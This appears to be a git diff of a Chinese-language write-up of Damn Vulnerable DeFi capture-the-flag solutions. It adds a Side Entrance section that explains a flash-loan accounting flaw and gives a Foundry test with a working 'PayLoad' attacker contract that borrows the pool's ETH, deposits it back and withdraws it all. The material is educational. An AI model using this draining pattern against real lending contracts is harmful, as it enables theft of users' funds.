@@ -31,7 +31,7 @@ uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
 assert(poolBalance == balanceBefore);
 ```
 
-而直接调用 `DVT Token` 合约 **transfer** 直接向借贷池合约发送代币, 不会更新 **poolBalance**,而 **flashLoan** 函数的 assert 检查  **poolBalance == balanceBefore** 无法通过, `ReceiverUnstoppable`合约调用借贷池合约 **flashLoan** 函数将不再正常工作.
+而调用 `DVT Token` 合约 **transfer** 直接向借贷池合约发送代币, 不会更新 **poolBalance**,而 **flashLoan** 函数的 assert 检查  **poolBalance == balanceBefore** 无法通过, `ReceiverUnstoppable`合约调用借贷池合约 **flashLoan** 函数将不再正常工作.
 
 
 
@@ -138,6 +138,8 @@ forge test --match-contract NaiveReceiver -vvvv
 
 ![NaiveReceiver](./testimage/NaiveReceiver.png)
 
+
+
 # #3 - Truster
 
 合约:
@@ -196,3 +198,80 @@ forge test --match-contract Truster -vvvv
 ```
 
 ![Truster](./testimage/Truster.png)
+
+
+
+# #4 - Side entrance
+
+合约:
+
+[SideEntranceLenderPool](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/side-entrance/SideEntranceLenderPool.sol)  借贷池合约
+
+完成条件: 
+
+`SideEntranceLenderPool` 合约允许任何人存入 ETH ,并可以在任何时间提取出,借贷池中有 1000 ETH 并提供免费的闪电贷,你需要清空借贷池的 ETH.
+
+解决方案:
+
+```solidity
+ function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        uint256 amountToWithdraw = balances[msg.sender];
+        balances[msg.sender] = 0;
+        payable(msg.sender).sendValue(amountToWithdraw);
+    }
+
+    function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+        require(balanceBefore >= amount, "Not enough ETH in balance");
+        
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
+    }
+```
+
+
+
+部署个合约调用 `SideEntranceLenderPool`借贷池的 **flashLoan() **函数借出池子里全部的 ETH,借贷池合约会接口调用我们部署的恶意合约的  **execute() **函数，在 **execut()** 函数里 **call()** 借贷池 **deposit()** 函数将闪电贷借出的 ETH 存入借贷池合约,使得能通过  **require** 金额检查,完成这笔闪电贷,再调用 **withdraw()** 取出 ETH,完成清空借贷池的 ETH.
+
+使用 foundry 编写测试:
+
+[SideEntrance.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/30349eba073206fe6b1c9acd26930468e543e064/src/test/SideEntrance.t.sol#L38-L69)
+
+```solidity
+    function testExploit() public {
+        vm.startPrank(attacker);
+        payload = new PayLoad(address(sideEntranceLenderPool));
+        payload.start();
+        vm.stopPrank();
+        verfiy();
+    }
+    
+contract PayLoad {
+    IsideEntranceLenderPool public sideentrancelenderPool;
+    constructor (address _target){
+        sideentrancelenderPool = IsideEntranceLenderPool(_target);
+    }
+
+    function start() public {
+        sideentrancelenderPool.flashLoan(1_000e18);
+        sideentrancelenderPool.withdraw();
+        selfdestruct(payable(msg.sender));
+    }
+        
+    function execute() public payable {
+       msg.sender.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
+    }
+
+    receive() external payable{}
+}
+```
+
+```
+forge test --match-contract SideEntrance -vvvv
+```
+
